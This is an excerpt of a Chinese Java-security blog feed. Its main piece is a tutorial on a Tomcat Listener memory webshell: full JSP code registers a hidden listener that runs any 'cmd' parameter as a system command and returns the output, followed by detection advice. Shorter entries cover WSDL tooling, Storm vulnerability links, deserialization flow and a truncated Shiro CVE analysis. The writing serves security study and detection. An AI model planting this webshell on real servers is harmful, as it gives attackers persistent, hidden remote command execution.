alt="image-20221027222247432"></p><p>可以看到我们构造的<code>ListenerTest()</code>方法的前一个是<code>StandardContext#fireRequestInitEvent()</code>方法，跟进该方法<br><img src="/2021/11/10/Listener%E5%86%85%E5%AD%98%E9%A9%AC/image-20221027224618262.png" alt="image-20221027224618262"></p><p>第一行调用了<code>getApplicationEventListeners()</code>方法获取对象数组，跟进该方法<br><img src="/2021/11/10/Listener%E5%86%85%E5%AD%98%E9%A9%AC/image-20221027225000747.png" alt="image-20221027225000747"></p><p>可以看到，<code>applicationEventListenersList</code>字段已经存储了我们的<code>ListenerTest</code>类<br><img src="/2021/11/10/Listener%E5%86%85%E5%AD%98%E9%A9%AC/image-20221027225147776.png" alt="image-20221027225147776"></p><p>也就是之前已经将<code>ListenerTest</code>类注册进了 Tomcat 服务器，既然是添加我们的恶意类到<code>applicationEventListenersList</code>列表中，那么一定会有一个添加的方法，尝试在该类中全局搜索<code>applicationEventListenersList</code>关键字，最后定位到了<code>addApplicationEventListener()</code>方法<br><img src="/2021/11/10/Listener%E5%86%85%E5%AD%98%E9%A9%AC/image-20221027225815382.png" alt="image-20221027225815382"></p><p>因此我们可以通过<code>addApplicationEventListener()</code>方法去将我们的恶意类添加到<code>listener</code>中进行注册，接下来继续跟着方法往下走<br><img src="/2021/11/10/Listener%E5%86%85%E5%AD%98%E9%A9%AC/image-20221027230816656.png" alt="image-20221027230816656"></p><p>对获取到的<code>instances</code>数组遍历并进行实例化，最终调用<code>requestInitialized()</code>方法。</p><p>接下来就是如何去获取<code>StandardContext</code>类，网上可以看到师傅们都挖出了很多种办法，关于<code>StandardContext</code>类的调用寻找日后有兴趣再慢慢聊吧。这里取其中一种：<code>StandardHostValve#invoke()</code>方法中可以通过<code>request</code>对象的<code>getContext()</code>方法获取到<code>StandardContext</code>类，而 JSP 本身就内置了<code>request</code>对象<br><img src="/2021/11/10/Listener%E5%86%85%E5%AD%98%E9%A9%AC/image-20221027231340401.png" alt="image-20221027231340401"></p><p>接下来就是编写 Listener 型内存马<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Response&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.ByteArrayOutputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;&lt;%--</span><br><span class="line">  Created by dotast on <span class="number">2022</span>/<span class="number">10</span>/<span class="number">27</span> <span class="number">23</span>:<span class="number">16</span></span><br><span class="line">--%&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">ListenerTest</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent servletRequestEvent)</span> &#123;</span><br><span class="line">            <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) servletRequestEvent.getServletRequest();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span>(cmd != <span class="literal">null</span>)&#123;</span><br><span class="line">                    <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> req.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">                    field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    <span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> (Request) field.get(req);</span><br><span class="line">                    <span class="type">Response</span> <span class="variable">response</span> <span class="operator">=</span> request.getResponse();</span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line">                    <span class="type">ByteArrayOutputStream</span> <span class="variable">bao</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">                    <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                    <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">while</span>((a = inputStream.read(bytes))!=-<span class="number">1</span>)&#123;</span><br><span class="line">                        bao.write(bytes,<span class="number">0</span>,a);</span><br><span class="line">                    &#125;</span><br><span class="line">                    response.getWriter().write(<span class="keyword">new</span> <span class="title class_">String</span>(bao.toByteArray()));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent servletRequestEvent)</span> &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) field.get(request);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) req.getContext();</span><br><span class="line">    <span class="type">ListenerTest</span> <span class="variable">listenerTest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListenerTest</span>();</span><br><span class="line">    standardContext.addApplicationEventListener(listenerTest);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></p><p>访问上传的内存马文件路径使其执行代码，注册内存马<br><img src="/2021/11/10/Listener%E5%86%85%E5%AD%98%E9%A9%AC/image-20221028161442814.png" alt="image-20221028161442814"></p><p>接着访问其他路由都可以成功执行命令<br><img src="/2021/11/10/Listener%E5%86%85%E5%AD%98%E9%A9%AC/image-20221028161520448.png" alt="image-20221028161520448"></p><h2 id="内存马的查杀排查"><a href="#内存马的查杀排查" class="headerlink" title="内存马的查杀排查"></a>内存马的查杀排查</h2><p>这里使用的回忆飘如雪师傅写的内存马查杀 JSP 脚本<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/c0ny1/java-memshell-scanner</span><br></pre></td></tr></table></figure></p><p>这里扫描到我们构造的 Listener 内存马，并且提供了 dump 操作供我们检查和 kill 操作供我们进行删除。<br><img src="/2021/11/10/Listener%E5%86%85%E5%AD%98%E9%A9%AC/image-20221029101459352.png" alt="image-20221029101459352"></p><p>除此之外我们也可以通过日志进行排查，首先上传的内存马大多都会执行命令，如果存在大量执行了命令但返回状态码为 404 或者 200 的记录可重点进行排查。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Java项目杂事</title>
      <link href="/2021/11/10/wsdl/"/>
      <url>/2021/11/10/wsdl/</url>
      
        <content type="html"><![CDATA[<h1 id="wsdl-相关"><a href="#wsdl-相关" class="headerlink" title="wsdl 相关"></a>wsdl 相关</h1><h2 id="恢复成java代码"><a href="#恢复成java代码" class="headerlink" title="恢复成java代码"></a>恢复成java代码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">wsimport -keep &quot;test.wsdl&quot; -p com.test -extension</span><br><span class="line"></span><br><span class="line">常用参数为:</span><br><span class="line">-d&lt;目录&gt;  - 将生成.class文件。默认参数。</span><br><span class="line">-s&lt;目录&gt; - 将生成.java文件。</span><br><span class="line">-p&lt;生成的新包名&gt; -将生成的类，放于指定的包下，自定义包结构。</span><br><span class="line">(wsdlurl) - http://server:port/service?wsdl，必须的参数。</span><br><span class="line">示例：</span><br><span class="line">C:/&gt; wsimport –s .</span><br><span class="line">C:/&gt; wsimport –s . –p com.sitech.web</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">注意：-s不能分开，-s后面有个小点，用于指定源代码生成的目录。点即当前目录。</span><br><span class="line">如果使用了-s参数则会在目录下生成两份代码，一份为.class代码。一份为.java代码。</span><br><span class="line">.class代码，可以经过打包以后使用。.java代码可以直接Copy到我们的项目中运行。</span><br></pre></td></tr></table></figure><h2 id="客户端调用"><a href="#客户端调用" class="headerlink" title="客户端调用"></a>客户端调用</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.cxf<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>cxf-rt-frontend-jaxws<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.4.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.cxf<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>cxf-rt-transports-http<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.4.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>java代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.cxf.endpoint.Client;</span><br><span class="line"><span class="keyword">import</span> org.apache.cxf.jaxws.endpoint.dynamic.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *https://www.programcreek.com/java-api-examples/?api=org.apache.cxf.jaxws.endpoint.dynamic.JaxWsDynamicClientFactory</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">JaxWsDynamicClientFactory</span> <span class="variable">factory</span> <span class="operator">=</span> JaxWsDynamicClientFactory.newInstance();</span><br><span class="line">        <span class="type">Client</span> <span class="variable">client</span> <span class="operator">=</span> factory.createClient(<span class="string">&quot;http://1.116.136.120:58081/admin/service/UserService?wsdl&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Object[] objects = client.invoke(<span class="string">&quot;sayHello&quot;</span>,<span class="string">&quot;admin&quot;</span>);</span><br><span class="line">            Arrays.stream(objects).forEach(System.out::println);</span><br><span class="line">            client.destroy();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote><p><a href="https://blog.51cto.com/u_15127638/2751110">https://blog.51cto.com/u_15127638/2751110</a><br><a href="https://blog.csdn.net/qq_32447301/article/details/79204311">https://blog.csdn.net/qq_32447301/article/details/79204311</a><br><a href="http://www.360doc.com/content/17/0105/20/835902_620335609.shtml">http://www.360doc.com/content/17/0105/20/835902_620335609.shtml</a></p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>apache storm</title>
      <link href="/2021/11/10/1/"/>
      <url>/2021/11/10/1/</url>
      
        <content type="html"><![CDATA[<h2 id="top-img-images-下载-png"><a href="#top-img-images-下载-png" class="headerlink" title="top_img: /images/下载.png"></a>top_img: /images/下载.png</h2><h1 id="apache-storm"><a href="#apache-storm" class="headerlink" title="apache storm"></a>apache storm</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><a href="https://blog.51cto.com/u_13870740/3445168">https://blog.51cto.com/u_13870740/3445168</a></p><p><a href="https://github.com/heibaiying/BigData-Notes/blob/master/notes/installation/Storm%E5%8D%95%E6%9C%BA%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.md">https://github.com/heibaiying/BigData-Notes/blob/master/notes/installation/Storm%E5%8D%95%E6%9C%BA%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.md</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup bash storm dev-zookeeper &amp; bash storm nimbus &amp; bash storm supervisor &amp;bash storm ui &amp; bash storm logviewer &amp;</span><br></pre></td></tr></table></figure><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p><a href="https://paper.seebug.org/1780/#0x03">https://paper.seebug.org/1780/#0x03</a></p><p><a href="https://blog.noah.360.net/apache-storm-vulnerability-analysis/">https://blog.noah.360.net/apache-storm-vulnerability-analysis/</a></p><p><a href="https://y4er.com/posts/apache-storm-two-cve/">https://y4er.com/posts/apache-storm-two-cve/</a></p><p><strong>自己尝试反序列化并没有成功cb,环境是2.1.0</strong></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Nothing</title>
      <link href="/2021/11/10/readobject%E6%B7%B1%E5%85%A5/"/>
      <url>/2021/11/10/readobject%E6%B7%B1%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="流程："><a href="#流程：" class="headerlink" title="流程："></a>流程：</h2><p><img src="/2021/11/10/readobject%E6%B7%B1%E5%85%A5/readobject.jpg" alt><br>ObjectInputSteram.readObject()</p><p>readObject0()</p><p>readOrdinaryObject()</p><p>desc = readClassDesc(false)</p><p>descriptor = readNonProxyDesc(unshared)</p><p>readDesc = readClassDescriptor()</p><p>cl = resolveClass(readDesc)</p><p>filterCheck(cl, -1)</p><p>desc.initNonProxy(readDesc, cl, resolveEx, readClassDesc(false))<br>各種初始化、檢查 suid 等</p><p>return desc</p><p>return descriptor</p><p>obj = desc.isInstantiable() ? desc.newInstance() : null</p><p>readSerialData(obj, desc)</p><p>slotDesc.invokeReadObject(obj, this)</p><p>readObjectMethod.invoke(obj, new Object[]{ in })</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>seacherobj</title>
      <link href="/2021/11/10/searchobj/"/>
      <url>/2021/11/10/searchobj/</url>
      
        <content type="html"><![CDATA[<h1 id="seacherobj"><a href="#seacherobj" class="headerlink" title="seacherobj"></a>seacherobj</h1><blockquote><p>学习一下searcherobj的方法</p><p><a href="https://blog.csdn.net/dhklsl/article/details/83992950">https://blog.csdn.net/dhklsl/article/details/83992950</a> </p><p><a href="https://blog.csdn.net/dhklsl/article/details/84751008">https://blog.csdn.net/dhklsl/article/details/84751008</a></p><p><a href="https://blog.csdn.net/dhklsl/article/details/88245460">https://blog.csdn.net/dhklsl/article/details/88245460</a></p></blockquote><h2 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h2><p>一个一个的去寻找</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 判断是否是List或者ArrayList</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> field</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isList</span><span class="params">(Field field)</span>&#123;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">simpleName</span> <span class="operator">=</span> field.getType().getSimpleName();</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;List&quot;</span>.equals(simpleName) || <span class="string">&quot;ArrayList&quot;</span>.equals(simpleName))&#123;</span><br><span class="line">        flag = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> flag;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 判断是否是Map或者HashMap</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> field</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isMap</span><span class="params">(Field field)</span>&#123;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">simpleName</span> <span class="operator">=</span> field.getType().getSimpleName();</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;Map&quot;</span>.equals(simpleName) || <span class="string">&quot;HashMap&quot;</span>.equals(simpleName))&#123;</span><br><span class="line">        flag = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> flag;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 检查object是否为java的基本数据类型</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> object</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">checkObjectIsSysType</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">objType</span> <span class="operator">=</span> object.getClass().toString();</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;byte&quot;</span>.equals(objType) || <span class="string">&quot;short&quot;</span>.equals(objType) || <span class="string">&quot;int&quot;</span>.equals(objType) || <span class="string">&quot;long&quot;</span>.equals(objType) || <span class="string">&quot;double&quot;</span>.equals(objType) || <span class="string">&quot;float&quot;</span>.equals(objType) || <span class="string">&quot;boolean&quot;</span>.equals(objType)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="json截取"><a href="#json截取" class="headerlink" title="json截取"></a>json截取</h2><p>思想非常简单就是将对象转换成json数据，然后在去截断我们需要的属性</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 方法二：从复杂对象中获取string类型的目标属性targetProName的值</span></span><br><span class="line"><span class="comment">     * 把对象转换成json字符串，然后截取第一次出现的targetProName的值</span></span><br><span class="line"><span class="comment">     * 适用条件：同方法一</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> object 复杂对象</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> targetProName 目标属性</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getBusinessNoFromArg</span><span class="params">(Object object,String targetProName)</span>&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">jsonString</span> <span class="operator">=</span> JSON.toJSONString(object);</span><br><span class="line">    System.err.println(<span class="string">&quot;jsonString=&quot;</span> + jsonString);</span><br><span class="line">    jsonString = StringUtils.substringAfter(jsonString,<span class="string">&quot;\&quot;&quot;</span>+targetProName + <span class="string">&quot;\&quot;:\&quot;&quot;</span>);<span class="comment">//去截断目标属性</span></span><br><span class="line">    jsonString = StringUtils.substringBefore(jsonString,<span class="string">&quot;\&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> jsonString;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2010-3863权限绕过分析</title>
      <link href="/2021/11/10/CVE-2010-3863/"/>
      <url>/2021/11/10/CVE-2010-3863/</url>
      
        <content type="html"><![CDATA[<h1 id="CVE-2010-3863权限绕过分析"><a href="#CVE-2010-3863权限绕过分析" class="headerlink" title="CVE-2010-3863权限绕过分析"></a>CVE-2010-3863权限绕过分析</h1><h2 id="初识shiro"><a href="#初识shiro" class="headerlink" title="初识shiro"></a>初识shiro</h2><blockquote><p><strong>Apache Shiro™</strong>是一个功能强大且易于使用的 Java 安全框架，它执行身份验证、授权、加密和会话管理。借助 Shiro 易于理解的 API，您可以快速轻松地保护任何应用程序——从最小的移动应用程序到最大的 Web 和企业应用程序。</p></blockquote><p>从官方简介中可以得知 shiro 是一套权限管理框架，在 shiro 框架中有以下三个核心概念模块：<code>Subject</code>、<code>SecurityManger</code>和<code>Realms</code><img src="/2021/11/10/CVE-2010-3863/image-20210418162523103.png" alt="image-20210418162523103"></p><ul><li><code>Subject</code>：当前正在执行的用户</li><li><code>SecurityManger</code>：安全管理器，管理所有用户的操作，是 shiro 架构的核心</li><li><code>Realm</code>：封装数据源，充当 shiro 与应用程序安全数据之间的桥梁，当需要与安全相关的数据(如用户帐户)进行实际交互以执行身份验证(登录)和授权(访问控制)时，为其提供身份验证或者授权。</li></ul><p>因此一次 请求—&gt; 认证 —&gt; 授权的流程为：</p><ol><li>web 应用程序获取当前的<code>Subject</code>并调用该<code>Subject</code>的校验方法；</li><li><code>Subject</code>传递校验到<code>SecurityManger</code>进行处理并进行判断；</li><li><code>SecurityManger</code>调用<code>Realm</code>获取配置信息，通过该配置信息判断当前的<code>Subject</code>所属角色是否能够进行操作。</li></ol><h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><p>该漏洞环境已经上传到 github 仓库上：<a href="https://github.com/dota-st/vulnEnv">https://github.com/dota-st/vulnEnv</a><br><img src="/2021/11/10/CVE-2010-3863/image-20221017113541029.png" alt="image-20221017113541029"></p><p>首先在配置文件<code>realm.ini</code>中定义了用户账号密码以及对应角色权限<br><img src="/2021/11/10/CVE-2010-3863/image-20221017113620512.png" alt="image-20221017113620512"></p><p>ShiroConfig<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ShiroConfig</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> IniRealm <span class="title function_">getIniRealm</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">IniRealm</span>(<span class="string">&quot;classpath:realm.ini&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> DefaultWebSecurityManager <span class="title function_">getDefaultWebSecurityManager</span><span class="params">(Realm realm)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">DefaultWebSecurityManager</span>(realm);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * anon：无需认证就可以访问</span></span><br><span class="line"><span class="comment">     * authc：必须认证才能访问</span></span><br><span class="line"><span class="comment">     * user：必须拥有记住我功能才能访问</span></span><br><span class="line"><span class="comment">     * perms：拥有某个资源的权限才能访问</span></span><br><span class="line"><span class="comment">     * role：拥有某个角色的权限才能访问</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    ShiroFilterFactoryBean <span class="title function_">getShiroFilterFactoryBean</span><span class="params">(DefaultWebSecurityManager defaultWebSecurityManager)</span> &#123;</span><br><span class="line">        <span class="type">ShiroFilterFactoryBean</span> <span class="variable">bean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ShiroFilterFactoryBean</span>();</span><br><span class="line">        